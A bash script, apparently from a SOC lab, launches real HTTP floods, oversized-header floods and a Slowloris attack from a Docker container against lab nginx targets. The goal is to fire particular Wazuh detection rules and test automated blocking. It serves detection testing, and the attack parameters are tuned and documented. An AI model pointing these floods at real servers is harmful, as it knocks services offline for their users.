#!/usr/bin/env bash
# Generates REAL traffic against the DMZ nginx targets, calibrated to land
# each of the four ddos_score_alert.py decision-relevant rule chains via
# genuine Wazuh rule firings (rules 100200/100210/100213,
# 100211/100212, and 100220/100221/100222 — see
# roles/wazuh_ddos_rules/files/local_rules_ddos.xml) — not synthetic
# webhook payloads. For direct synthetic testing of the scoring code
# itself, see ./test_scoring.sh instead.
#
# Usage:
#   ./run_attack.sh [ubuntu|windows|both] [log_only|notify_soc|auto_block|error_flood]
#
# Examples:
#   ./run_attack.sh ubuntu log_only
#   ./run_attack.sh ubuntu notify_soc
#   ./run_attack.sh ubuntu auto_block
#   ./run_attack.sh ubuntu error_flood
#   ./run_attack.sh both auto_block
#
# How each case is engineered against the ACTUAL rule chain + scoring
# (verified live during development — see README.md §5-6):
#
#   log_only   - a short/light HTTP burst (plain curl, not wrk -- see note
#                below). Fires rule 100210 (level 8, D1=+0) a handful of
#                times but never sustains long enough to reach 100213
#                (needs 50x 100210 in 30s). D1+D2 tops out at 30 (D2's max
#                +30 needs >=20 historical hits) — always < 40, so this
#                can never accidentally escalate. Verified live: a fresh
#                srcip, n=250/c=20, fired 100210 14x and 100213 0x.
#
#   auto_block - a heavy sustained flood via wrk. Reliably reaches rule
#                100213 (level 12, D1=+40) on dmz-ubuntu. Because
#                wazuh_history counts ANY indexed alert for that srcip (no
#                rule-id filter), by the time 50 100210 hits have
#                accumulated (required for 100213 to fire at all) the 24h
#                history for that IP is already >=20 (D2=+30) -> 40+30=70 ->
#                AUTO_BLOCK. In other words: once real flood traffic is
#                heavy enough to trigger 100213 at all, it ALWAYS also
#                satisfies D2's top bucket, so this path can never land on
#                NOTIFY_SOC. Verified live: t=4/c=150 for just 10s already
#                fired 100213 14x.
#
#                dmz-windows needed two fixes before this same flood could
#                ever reach 100213 there at all (see deploy_windows_dmz.yml
#                and windows-dmz/docker-compose.yml, both applied by
#                default now): the Windows VM only gets 2 vCPUs by default
#                (dockurr/windows), which under this flood left nginx and
#                wazuh-agent starved for CPU — bumped to CPU_CORES=4. Once
#                that stopped being the bottleneck, the agent's OWN
#                client_buffer rate-limiter (hard-capped at 1000 EPS,
#                Wazuh's documented maximum) became the new ceiling and
#                started dropping events ("Agent buffer is flooded") —
#                fixed by disabling client_buffer entirely. Verified live
#                after both fixes: 100213 fired 37-40x per run, with a real
#                Windows Firewall block landing each time.
#
#   notify_soc - NOT reachable via the flood rules at all (see above), so
#                this drives real Slowloris traffic instead via
#                slowhttptest's -H (slow-headers/Slowloris) mode: dozens
#                of concurrent incomplete HTTP requests held open, with
#                the followup-data interval set beyond nginx's
#                client_header_timeout (default 60s, unconfigured on both
#                targets) so it never actually resends and the timeout
#                fires for real, logging a genuine 408 for each. That's
#                rule 100211 (level 1, base tag, invisible below Wazuh's
#                alert_log_level=3) -> 100212 (level 10, freq 50/30s,
#                D1=+25 -- capped there, 100212 can NEVER reach AUTO_BLOCK
#                on its own even with max history: 25+30=55). A short
#                warm-up flood runs first so the srcip already has >=5
#                indexed alerts (D2=+20) by the time the Slowloris burst's
#                100212 alert scores -- otherwise a truly fresh IP would
#                land at 25 (LOG_ONLY), one dimension short. This case
#                takes ~75s wall-clock because it's waiting on nginx's
#                real timeout, not a shortcut — it's driving an actual
#                Slowloris attack via the canonical tool for it. Verified
#                live: c=60/i=65s/l=75s produced 60 genuine 408s and fired
#                100212 exactly once.
#
#   error_flood - drives the generic 4xx error-flood branch (100220->100221
#                ->100222) specifically, using oversized-header requests
#                instead of plain GETs: each request carries a ~20KB header
#                value, comfortably over nginx's default
#                large_client_header_buffers (4x8k, unconfigured on both
#                targets), so nginx answers 400 instead of 200 for every
#                request. Rule 100220 excludes 408 (negate="yes"), so this
#                is a genuinely independent signal from notify_soc's
#                Slowloris path, not a duplicate of it. Needs a much higher
#                count than auto_block's math would suggest: a curl+xargs
#                loop (unlike wrk's duration-bound model) blows through even
#                5000 oversized-header requests in ~2-4s wall-clock, so a
#                fixed count has to be large enough to rack up 50 crossings
#                of the 100-hits/10s window before the burst itself runs out
#                of requests. Verified live: 5000 requests produced only 25x
#                100221 and 0x 100222 (burst finished too fast); 10000
#                requests reliably produced ~290x 100221 and ~20x 100222.
#
# Why curl (not wrk) drives the count-bounded bursts: wrk has no
# request-count cap, only a duration floor of 1 whole second, and even
# `wrk -t1 -c1 -d1s` against these targets pushes ~1-2k req/s -- enough to
# fire rule 100213 by itself (verified live: 19x). wrk is used only for
# auto_block's genuinely duration-bound heavy flood; log_only and the
# notify_soc warm-up need an exact low request count, which only a plain
# curl loop gives.

set -euo pipefail

TARGET="${1:-both}"
CASE="${2:-auto_block}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE_FILE="$SCRIPT_DIR/.last_ip_octet"
IMAGE_NAME="ddos-attacker:latest"
CONTAINER_NAME="ddos-attacker"
UBUNTU_NET="dmz-ubuntu_default"
WINDOWS_NET="windows-dmz_default"

# .2 is always the real target on both /16 networks, .3 is the old
# compose-managed attacker identity — stay well clear of both.
IP_MIN=10
IP_MAX=250

case "$TARGET" in
    ubuntu|windows|both) ;;
    *)
        echo "Usage: $0 [ubuntu|windows|both] [log_only|notify_soc|auto_block|error_flood]" >&2
        exit 1
        ;;
esac
case "$CASE" in
    log_only|notify_soc|auto_block|error_flood) ;;
    *)
        echo "Usage: $0 [ubuntu|windows|both] [log_only|notify_soc|auto_block|error_flood]" >&2
        exit 1
        ;;
esac

# ── Pick a source IP this run has never used before ─────────────────────────
last="$IP_MIN"
[[ -f "$STATE_FILE" ]] && last="$(cat "$STATE_FILE")"
octet=$((last + 1))
(( octet > IP_MAX )) && octet="$IP_MIN"
echo "$octet" > "$STATE_FILE"

UBUNTU_IP="172.23.0.$octet"
WINDOWS_IP="172.21.0.$octet"
echo "=== This run's attacker identity: dmz-ubuntu-side=$UBUNTU_IP  windows-side=$WINDOWS_IP ==="

# ── Build the attack image once; near-instant on every run after that ──────
if [[ -z "$(docker images -q "$IMAGE_NAME" 2>/dev/null)" ]]; then
    echo "Building $IMAGE_NAME (one-time, has curl + wrk + slowhttptest baked in)..."
    docker build -q -t "$IMAGE_NAME" "$SCRIPT_DIR" >/dev/null
fi

# ── Replace last run's ephemeral attacker container ─────────────────────────
docker rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true
docker run -d --name "$CONTAINER_NAME" \
    --network "$UBUNTU_NET" --ip "$UBUNTU_IP" \
    "$IMAGE_NAME" >/dev/null
docker network connect --ip "$WINDOWS_IP" "$WINDOWS_NET" "$CONTAINER_NAME"

pre_check() {
    local name="$1" url="$2"
    if ! docker exec "$CONTAINER_NAME" curl -s -o /dev/null -w "pre-check ($name): HTTP %{http_code}\n" --max-time 5 "$url"; then
        echo "WARNING: $name did not respond to a pre-check request — continuing anyway." >&2
    fi
}

flood_by_count() {
    # Hard-capped request count — needed for log_only and the notify_soc
    # warm-up. wrk has no request-count cap (only a whole-second duration
    # floor), and this nginx/backend is fast enough that even its shortest
    # possible burst races through thousands of requests and trips 100213
    # (verified live). A plain curl loop, fanned out over $concurrency
    # parallel workers via xargs, is the only reliable way to send an
    # exact low count.
    local url="$1" n="$2" concurrency="$3"
    docker exec "$CONTAINER_NAME" bash -c "
        start=\$(date +%s%N)
        seq 1 $n | xargs -P $concurrency -I{} curl -s -o /dev/null '$url'
        end=\$(date +%s%N)
        echo \"Complete requests: $n\"
        echo \"Time taken: \$(( (end - start) / 1000000 ))ms\"
    "
}

flood_oversized_header() {
    # Provokes a genuine nginx 4xx (expected: 400 Bad Request) by sending a
    # single header value (~20KB) larger than nginx's default
    # large_client_header_buffers (4x8k) - nginx's own docs say this returns
    # 400 and closes the connection. Neither dmz-ubuntu's nor dmz-windows'
    # nginx config overrides this default, so the stock 8k ceiling applies
    # on both targets (verified live against the real dmz-ubuntu target).
    # Rule 100220 has no <id> narrowing beyond excluding 408, so any 4xx
    # nginx actually returns here satisfies it identically.
    local url="$1" n="$2" concurrency="$3"
    local big_header
    big_header="$(head -c 20000 /dev/zero | tr '\0' 'A')"
    docker exec "$CONTAINER_NAME" bash -c "
        big='$big_header'
        seq 1 $n | xargs -P $concurrency -I{} curl -s -o /dev/null -w '%{http_code}\n' -H \"X-Attack-Padding: \$big\" '$url'
    " | sort | uniq -c
}

flood_by_time() {
    # Genuinely duration-bound sustained flood — wrk's native mode.
    local url="$1" duration="$2" concurrency="$3"
    local threads=$(( concurrency < 4 ? concurrency : 4 ))
    docker exec "$CONTAINER_NAME" wrk -t "$threads" -c "$concurrency" -d "${duration}s" "$url" 2>&1 \
        | grep -E "requests in|Requests/sec|Non-2xx"
}

slowloris() {
    # Drives a real Slowloris attack with slowhttptest's -H (slow
    # headers) mode: opens $n concurrent connections, sends a partial
    # request, then — critically — sets the followup-data interval (-i)
    # LONGER than nginx's client_header_timeout (~60s) so it never
    # actually resends before that timeout fires for real. Without this,
    # slowhttptest's normal behavior (periodic followup junk headers) is
    # designed to keep connections alive indefinitely, which would starve
    # us of the 408s rule 100211/100212 depend on. -l (test length) must
    # cover past the 60s timeout so slowhttptest is still running to see
    # it happen. Verified live: c=60/i=65/l=75 produced 60 genuine 408s
    # and fired rule 100212 exactly once.
    local host="$1" n="$2"
    echo "Opening $n incomplete connections to $host:80 (nginx default client_header_timeout ~60s)..."
    docker exec "$CONTAINER_NAME" slowhttptest -H -c "$n" -r "$n" -i 65 -l 75 -u "http://$host/" 2>&1 \
        | grep -E "Test ended|open connections left"
    echo "Slowloris burst complete — all connections should have timed out by now."
}

run_case() {
    local name="$1" host="$2" url="$3"
    echo "=== [$CASE] $name ($url) ==="
    pre_check "$name" "$url"
    case "$CASE" in
        log_only)
            flood_by_count "$url" 250 20
            ;;
        error_flood)
            # Drives the generic 4xx error-flood chain (100220->100221->
            # 100222) specifically. Verify counts with:
            #   docker exec single-node-wazuh.manager-1 tail -f /var/ossec/logs/alerts/alerts.json | grep -E '"id":"1002(20|21|22)"'
            flood_oversized_header "$url" 10000 150
            ;;
        auto_block)
            flood_by_time "$url" 30 150
            ;;
        notify_soc)
            echo "-- warm-up flood (builds >=5 indexed 100210 hits for D2) --"
            # A single instant burst is unreliable here: near-simultaneous
            # requests collapse into a variable number of separate 100210
            # firings depending on system-load timing jitter alone (verified
            # live — identical params, different counts run to run). Six
            # separate bursts 2s apart, n=120/c=20 each, reliably lands
            # somewhere in the 5-30 range in total (verified live: 23) —
            # comfortably clearing D2's >=5 floor while staying far below
            # the 50-hits/30s needed to accidentally trip 100213.
            for _ in 1 2 3 4 5 6; do
                flood_by_count "$url" 120 20 >/dev/null
                sleep 2
            done
            echo "Waiting 5s for the warm-up alerts to index..."
            sleep 5
            echo "-- Slowloris burst (drives real rule 100211 -> 100212) --"
            slowloris "$host" 60
            ;;
    esac
    echo
}

case "$TARGET" in
    ubuntu)  run_case "dmz-ubuntu" "dmz-ubuntu" "http://dmz-ubuntu:80/" ;;
    windows) run_case "dmz-windows" "windows" "http://windows:80/" ;;
    both)
        run_case "dmz-ubuntu" "dmz-ubuntu" "http://dmz-ubuntu:80/"
        run_case "dmz-windows" "windows" "http://windows:80/"
        ;;
esac

cat <<EOF
Done. Source IPs used this run: dmz-ubuntu-side=$UBUNTU_IP  windows-side=$WINDOWS_IP
Next run will use a fresh, never-before-cached IP automatically.

Check for alerts on the SOC host:
  docker exec single-node-wazuh.manager-1 tail -f /var/ossec/logs/alerts/alerts.json | grep -E '"id":"1002(10|11|12|13|20|21|22)"'

Or watch the Shuffle DDoS workflow pick them up:
  Shuffle UI -> Workflows -> "Wazuh DDoS Auto-Response" -> Runs
EOF
